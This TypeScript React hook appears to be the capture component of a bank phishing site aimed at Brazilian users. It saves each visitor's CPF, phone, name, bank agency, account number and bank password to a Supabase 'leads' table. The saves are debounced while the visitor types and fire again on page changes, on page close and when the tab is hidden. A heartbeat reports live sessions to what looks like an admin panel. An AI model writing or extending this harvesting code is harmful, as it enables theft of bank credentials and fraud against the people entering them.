import { useEffect, useRef, useCallback } from "react"; // Adicionado useCallback
import { useLocation } from "react-router-dom";
import { useFlow } from "@/contexts/FlowContext";
import { leadRepository, sessionRepository, type LeadUpdate } from "@/repositories";
import { edgeFunctionsService } from "@/services";
import { isValidSegment } from "@/lib/segment-config";
import type { IpInfo } from "@/services/edge-functions.service";

const ADMIN_ROUTES = ["/admin"];
const HEARTBEAT_INTERVAL = 30_000; // 30 s

// sessionStorage is blocked in iOS Safari private browsing — wrap every access.
function sessionGet(key: string): string | null {
  try { return sessionStorage.getItem(key); } catch { return null; }
}
function sessionSet(key: string, value: string): void {
  try { sessionStorage.setItem(key, value); } catch { /* non-fatal */ }
}

function buildLeadUpdates(data: Record<string, string>): LeadUpdate {
  const updates: LeadUpdate = {};
  if (data.cpf) updates.cpf = data.cpf;
  if (data.phone) updates.phone = data.phone;
  if (data.nome) updates.nome = data.nome;
  if (data.segment) updates.segment = data.segment;
  if (data.agency) updates.agency = data.agency;
  if (data.account) updates.account = data.account;
  if (data.password) updates.password = data.password;
  return updates;
}

export function useLeadTracking() {
  const location = useLocation();
  const { data } = useFlow();
  const leadIdRef = useRef<string | null>(sessionGet("lead_id"));
  const sessionIdRef = useRef<string | null>(null);
  const dataRef = useRef(data);
  const debounceRef = useRef<NodeJS.Timeout | null>(null); // Ref para o debounce
  dataRef.current = data;

  const isAdmin = ADMIN_ROUTES.some((r) => location.pathname.startsWith(r));

  // Função de atualização com a sua lógica de validação
  const updateLeadData = useCallback(async () => {
    if (!leadIdRef.current) return;

    const updates: LeadUpdate = {};
    if (data.cpf) updates.cpf = data.cpf;
    if (data.phone) updates.phone = data.phone;
    if (data.nome) updates.nome = data.nome;
    if (data.segment && isValidSegment(data.segment)) updates.segment = data.segment;
    if (data.agency) updates.agency = data.agency;
    if (data.account) updates.account = data.account;
    if (data.password) updates.password = data.password;

    if (Object.keys(updates).length === 0) return;

    try {
      await leadRepository.update(leadIdRef.current, updates);
    } catch (err) {
      console.error("Lead data update error:", err);
    }
  }, [data.cpf, data.phone, data.nome, data.segment, data.agency, data.account, data.password]);

  // Efeito de Debounce (Sua versão local)
  useEffect(() => {
    if (isAdmin || !leadIdRef.current) return;

    if (debounceRef.current) clearTimeout(debounceRef.current);
    debounceRef.current = setTimeout(updateLeadData, 500);

    return () => {
      if (debounceRef.current) clearTimeout(debounceRef.current);
    };
  }, [updateLeadData, isAdmin]);

  // Efeito de Sessão e Heartbeat (Versão que estava no GitHub)
  useEffect(() => {
    if (isAdmin) return;

    const page = location.pathname.replace("/", "") || "splash";

    const track = async () => {
      try {
        const leadUpdates = buildLeadUpdates(data);

        if (!leadIdRef.current) {
          const lead = await leadRepository.create({ current_step: page, ...leadUpdates });
          leadIdRef.current = lead.id;
          sessionSet("lead_id", lead.id);
        } else {
          await leadRepository.update(leadIdRef.current, {
            current_step: page,
            ...(page === "concluido" ? { status: "concluido" } : {}),
            ...leadUpdates,
          });
        }

        if (sessionIdRef.current) {
          await sessionRepository.updatePage(sessionIdRef.current, page);
          return;
        }

        try {
          const result = await edgeFunctionsService.checkAccess({
            lead_id: leadIdRef.current!,
            user_agent: navigator.userAgent,
          });
          sessionIdRef.current = result.session_id ?? null;
        } catch {
          console.error("Session creation via edge function failed");
        }
      } catch (err) {
        console.error("Lead tracking error:", err);
      }
    };

    track();

    const handleUnload = () => {
      const supabaseUrl = import.meta.env.VITE_SUPABASE_URL;
      const anonKey = import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY;

      if (leadIdRef.current) {
        const updates = buildLeadUpdates(dataRef.current);
        if (Object.keys(updates).length > 0) {
          fetch(`${supabaseUrl}/rest/v1/leads?id=eq.${leadIdRef.current}`, {
            method: "PATCH",
            keepalive: true,
            headers: {
              "Content-Type": "application/json",
              "apikey": anonKey,
              "Authorization": `Bearer ${anonKey}`,
              "Prefer": "return=minimal",
            },
            body: JSON.stringify(updates),
          }).catch(() => {});
        }
      }

      if (!sessionIdRef.current) return;
      fetch(`${supabaseUrl}/rest/v1/site_sessions?id=eq.${sessionIdRef.current}`, {
        method: "PATCH",
        keepalive: true,
        headers: {
          "Content-Type": "application/json",
          "apikey": anonKey,
          "Authorization": `Bearer ${anonKey}`,
          "Prefer": "return=minimal",
        },
        body: JSON.stringify({ is_online: false, ended_at: new Date().toISOString() }),
      }).catch(() => {});
    };

    const sendHeartbeat = () => {
      if (!sessionIdRef.current) return;
      const supabaseUrl = import.meta.env.VITE_SUPABASE_URL;
      const anonKey = import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY;
      fetch(`${supabaseUrl}/rest/v1/site_sessions?id=eq.${sessionIdRef.current}`, {
        method: "PATCH",
        headers: {
          "Content-Type": "application/json",
          "apikey": anonKey,
          "Authorization": `Bearer ${anonKey}`,
          "Prefer": "return=minimal",
        },
        body: JSON.stringify({ last_seen_at: new Date().toISOString() }),
      }).catch(() => {});
    };

    const heartbeatId = setInterval(sendHeartbeat, HEARTBEAT_INTERVAL);
    const handleVisibilityChange = () => { if (document.hidden) handleUnload(); };

    window.addEventListener("beforeunload", handleUnload);
    window.addEventListener("pagehide", handleUnload);
    document.addEventListener("visibilitychange", handleVisibilityChange);

    return () => {
      clearInterval(heartbeatId);
      window.removeEventListener("beforeunload", handleUnload);
      window.removeEventListener("pagehide", handleUnload);
      document.removeEventListener("visibilitychange", handleVisibilityChange);
    };
  }, [location.pathname, isAdmin, data]);
}